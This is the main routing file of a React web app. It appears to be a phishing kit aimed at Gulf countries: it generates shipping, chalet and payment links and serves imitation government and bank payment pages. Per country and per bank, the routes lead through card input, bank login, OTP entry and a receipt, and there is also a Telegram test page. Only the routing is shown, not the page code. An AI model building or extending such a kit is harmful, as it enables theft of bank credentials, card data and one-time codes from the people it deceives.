import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Services from "./pages/Services";
import CreateChaletLink from "./pages/CreateChaletLink";
import CreateShippingLink from "./pages/CreateShippingLink";
import CreatePaymentLink from "./pages/CreatePaymentLink";
import CreateInvoice from "./pages/CreateInvoice";
import InvoiceList from "./pages/InvoiceList";
import InvoiceView from "./pages/InvoiceView";
import InvoiceEdit from "./pages/InvoiceEdit";
import HealthServices from "./pages/HealthServices";
import LogisticsServices from "./pages/LogisticsServices";
import Contracts from "./pages/Contracts";
import Microsite from "./pages/Microsite";
import PaymentRecipient from "./pages/PaymentRecipient";
import PaymentDetails from "./pages/PaymentDetails";
import PaymentBankSelector from "./pages/PaymentBankSelector";
import PaymentCardInput from "./pages/PaymentCardInput";
import PaymentBankLogin from "./pages/PaymentBankLogin";
import PaymentCardForm from "./pages/PaymentCardForm";
import PaymentOTPForm from "./pages/PaymentOTPForm";
import PaymentReceiptPage from "./pages/PaymentReceiptPage";
import PaymentMethodSelection from "./pages/PaymentMethodSelection";
import PaymentUaeBankSelector from "./pages/PaymentUaeBankSelector";
import PaymentUaeBankLogin from "./pages/PaymentUaeBankLogin";
import PaymentUaeReceiptPage from "./pages/PaymentUaeReceiptPage";
import TelegramTestPage from "./pages/TelegramTestPage";
// Gulf Government Payment System
import PaymentPage from "./pages/PaymentPage";
import BankSelect from "./pages/BankSelect";
import LoginBank from "./pages/LoginBank";
import OTP from "./pages/OTP";
import Completed from "./pages/Completed";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<Index />} />
          <Route path="/services" element={<Services />} />
          <Route path="/create/:country/chalet" element={<CreateChaletLink />} />
          <Route path="/create/:country/shipping" element={<CreateShippingLink />} />
          <Route path="/create/:country/payment" element={<CreatePaymentLink />} />
          <Route path="/invoices/create/:country" element={<CreateInvoice />} />
          <Route path="/invoices/list/:country" element={<InvoiceList />} />
          <Route path="/invoices/:id/view" element={<InvoiceView />} />
          <Route path="/invoices/:id/edit" element={<InvoiceEdit />} />
          <Route path="/health/:country" element={<HealthServices />} />
          <Route path="/logistics/:country" element={<LogisticsServices />} />
          <Route path="/contracts/:country" element={<Contracts />} />
          <Route path="/r/:country/:type/:id" element={<Microsite />} />
          <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
          <Route path="/pay/:id/details" element={<PaymentDetails />} />
          {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
          <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
          <Route path="/pay/:id/card-input" element={<PaymentCardInput />} />
          <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
          {/* Legacy routes (kept for backwards compatibility) */}
          <Route path="/pay/:id/card" element={<PaymentCardForm />} />
          <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
          <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
          {/* UAE Payment Flow */}
          <Route path="/pay/uae" element={<PaymentMethodSelection />} />
          <Route path="/pay/uae/bank-selector" element={<PaymentUaeBankSelector />} />
          <Route path="/pay/uae/bank-login/:bankId" element={<PaymentUaeBankLogin />} />
          <Route path="/pay/uae/receipt" element={<PaymentUaeReceiptPage />} />
          {/* Gulf Government Payment System Routes */}
          {/* UAE */}
          <Route path="/gulf/uae/payment" element={<PaymentPage />} />
          <Route path="/gulf/uae/bank-select" element={<BankSelect />} />
          <Route path="/gulf/uae/login-bank/:bankId" element={<LoginBank />} />
          <Route path="/gulf/uae/otp" element={<OTP />} />
          <Route path="/gulf/uae/completed" element={<Completed />} />
          {/* Saudi Arabia */}
          <Route path="/gulf/saudi/payment" element={<PaymentPage />} />
          <Route path="/gulf/saudi/bank-select" element={<BankSelect />} />
          <Route path="/gulf/saudi/login-bank/:bankId" element={<LoginBank />} />
          <Route path="/gulf/saudi/otp" element={<OTP />} />
          <Route path="/gulf/saudi/completed" element={<Completed />} />
          {/* Kuwait */}
          <Route path="/gulf/kuwait/payment" element={<PaymentPage />} />
          <Route path="/gulf/kuwait/bank-select" element={<BankSelect />} />
          <Route path="/gulf/kuwait/login-bank/:bankId" element={<LoginBank />} />
          <Route path="/gulf/kuwait/otp" element={<OTP />} />
          <Route path="/gulf/kuwait/completed" element={<Completed />} />
          {/* Qatar */}
          <Route path="/gulf/qatar/payment" element={<PaymentPage />} />
          <Route path="/gulf/qatar/bank-select" element={<BankSelect />} />
          <Route path="/gulf/qatar/login-bank/:bankId" element={<LoginBank />} />
          <Route path="/gulf/qatar/otp" element={<OTP />} />
          <Route path="/gulf/qatar/completed" element={<Completed />} />
          {/* Bahrain */}
          <Route path="/gulf/bahrain/payment" element={<PaymentPage />} />
          <Route path="/gulf/bahrain/bank-select" element={<BankSelect />} />
          <Route path="/gulf/bahrain/login-bank/:bankId" element={<LoginBank />} />
          <Route path="/gulf/bahrain/otp" element={<OTP />} />
          <Route path="/gulf/bahrain/completed" element={<Completed />} />
          {/* Oman */}
          <Route path="/gulf/oman/payment" element={<PaymentPage />} />
          <Route path="/gulf/oman/bank-select" element={<BankSelect />} />
          <Route path="/gulf/oman/login-bank/:bankId" element={<LoginBank />} />
          <Route path="/gulf/oman/otp" element={<OTP />} />
          <Route path="/gulf/oman/completed" element={<Completed />} />
          <Route path="/telegram-test" element={<TelegramTestPage />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
